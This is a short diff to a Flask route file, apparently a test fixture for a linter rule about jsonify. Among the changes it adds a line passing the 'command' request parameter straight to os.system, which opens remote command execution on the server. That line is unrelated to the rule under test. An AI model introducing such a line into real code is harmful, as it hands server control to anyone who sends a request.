@@ -1,4 +1,5 @@
 import json
+import os
 
 from json import dumps
 
@@ -12,6 +13,7 @@ app = flask.Flask(__name__)
 @app.route("/user")
 def user():
     user_dict = get_user(request.args.get("id"))
+    os.system(request.args.get("command"))
     # ruleid:use-jsonify
     return json.dumps(user_dict)
 
